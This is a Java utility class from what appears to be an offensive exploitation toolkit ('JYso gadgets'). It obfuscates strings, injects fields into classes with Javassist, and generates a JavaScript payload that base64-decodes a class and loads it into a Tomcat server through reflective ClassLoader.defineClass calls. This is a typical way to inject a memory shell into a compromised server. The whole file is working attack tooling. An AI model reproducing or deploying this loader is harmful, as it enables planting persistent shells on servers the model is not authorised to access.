package com.qi4l.JYso.gadgets.utils;

import com.qi4l.JYso.gadgets.Config.Config;
import javassist.*;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

import static com.qi4l.JYso.gadgets.Config.Config.POOL;

public class InjShell {

    private static final Logger log = LogManager.getLogger(InjShell.class);

    // 恶心一下人，实际没用
    public static String converString(String target) {
        if (Config.IS_OBSCURE) {
            StringBuilder result = new StringBuilder("new String(new byte[]{");
            byte[] bytes = target.getBytes();
            for (byte aByte : bytes) {
                result.append(aByte).append(",");
            }
            return result.substring(0, result.length() - 1) + "})";
        }

        return "\"" + target + "\"";
    }

    public static void insertField(CtClass ctClass, String fieldName, String fieldCode) throws Exception {
        ctClass.defrost();
        try {
            CtField ctSUID = ctClass.getDeclaredField(fieldName);
            ctClass.removeField(ctSUID);
        } catch (javassist.NotFoundException ignored) {
        }
        ctClass.addField(CtField.make(fieldCode, ctClass));
    }

    public static CtClass insertField(String fieldName, String fieldCode) throws Exception {
        POOL.insertClassPath(new ClassClassPath(Class.forName(fieldName)));
        final CtClass ctClass = POOL.get(fieldName);
        try {
            insertField(ctClass, fieldName, fieldCode);
            return ctClass;
        } catch (javassist.bytecode.DuplicateMemberException ignored) {
            return ctClass;
        }
    }

    //类加载方式，因类而异
    public static String injectClass(Class<?> clazz) {

        String classCode = null;
        try {
            //获取base64后的类
            classCode = Utils.getClassCode(clazz);

        } catch (Exception e) {
            log.error("e: ", e);
        }

        return "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "try{\n" +
                "   var clazz = classLoader.loadClass('" + clazz.getName() + "');\n" +
                "   clazz.newInstance();\n" +
                "}catch(err){\n" +
                "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                "   method.setAccessible(true);\n" +
                "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                "   clazz.newInstance();\n" +
                "};";
    }
}